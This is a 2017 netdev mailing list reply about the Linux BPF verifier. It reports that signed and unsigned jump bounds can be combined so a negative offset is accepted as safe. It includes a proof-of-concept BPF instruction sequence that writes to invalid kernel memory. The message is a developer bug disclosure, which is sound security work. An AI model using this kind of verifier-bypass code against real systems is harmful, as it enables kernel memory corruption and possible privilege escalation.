From: Edward Cree <ecree@solarflare.com>
Subject: Re: More BPF verifier questions
Date: Tue, 6 Jun 2017 15:17:19 +0100
Message-ID: <02c68aaa-1606-5229-7d12-5e633487c45c@solarflare.com>
References: <24a519bc-d403-f429-5d72-2a1d31edfbe7@solarflare.com>
 <f75a8721-5cb0-f0bd-6224-b11bab1f036e@fb.com>
 <20170605184754.GA30973@li70-116.members.linode.com>
Mime-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit
Cc: Alexei Starovoitov <alexei.starovoitov@gmail.com>,
        Daniel Borkmann <daniel@iogearbox.net>,
        netdev <netdev@vger.kernel.org>,
        David Miller <davem@davemloft.net>,
        iovisor-dev <iovisor-dev@lists.iovisor.org>,
        "Josef Bacik" <jbacik@fb.com>
To: Josef Bacik <josef@toxicpanda.com>, Alexei Starovoitov <ast@fb.com>
Return-path: <netdev-owner@vger.kernel.org>
Received: from dispatch1-us1.ppe-hosted.com ([67.231.154.164]:54645 "EHLO
        dispatch1-us1.ppe-hosted.com" rhost-flags-OK-OK-OK-OK)
        by vger.kernel.org with ESMTP id S1751281AbdFFORi (ORCPT
        <rfc822;netdev@vger.kernel.org>); Tue, 6 Jun 2017 10:17:38 -0400
In-Reply-To: <20170605184754.GA30973@li70-116.members.linode.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

On 05/06/17 19:47, Josef Bacik wrote:
> On Mon, Jun 05, 2017 at 11:11:05AM -0700, Alexei Starovoitov wrote:
>> Do you have an asm test case that demonstrates that?
> From here we want to exploit the fact that false_reg->min_value is not
> necessarily correct, but in order to do that we need to get false_reg->max_value
> below the actual size limit for the data we're reaching into, which means we
> want to _only_ change false_reg->max_value.  Thankfully there doesn't appear to
> be a way to do that, everything changes either only min_value or both min_value
> and max_value.  I think we're safe here, unless I've missed something.  Thanks,
Here's the basic idea:
    r1 = -8
    r2 = -1
    JGT r1, r2, end
    JSGT r1, 1, end
    ptr += r1
    *(u8 *)ptr = 0
After the JGT, we're in the false branch so r1->min_value = 0 and r1->max_value
 = (u64)-1.
After the JSGT, we're again in the false branch so r1->max_value = 1.
So when we add r1 to the pointer, the verifier thinks it's safe, but it's not,
 because r1 is really negative.

And here's the asm:
    BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
    BPF_LD_MAP_FD(BPF_REG_1, 0),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,
                 BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 7),
    BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, -8),
    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_10, -16),
    BPF_MOV64_IMM(BPF_REG_2, -1),
    BPF_JMP_REG(BPF_JGT, BPF_REG_1, BPF_REG_2, 3),
    BPF_JMP_IMM(BPF_JSGT, BPF_REG_1, 1, 2),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),
    BPF_ST_MEM(BPF_B, BPF_REG_0, 0, 0),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
The verifier currently accepts this program (with an appropriate map fd), but I
 believe when run it will access invalid memory.

-Ed
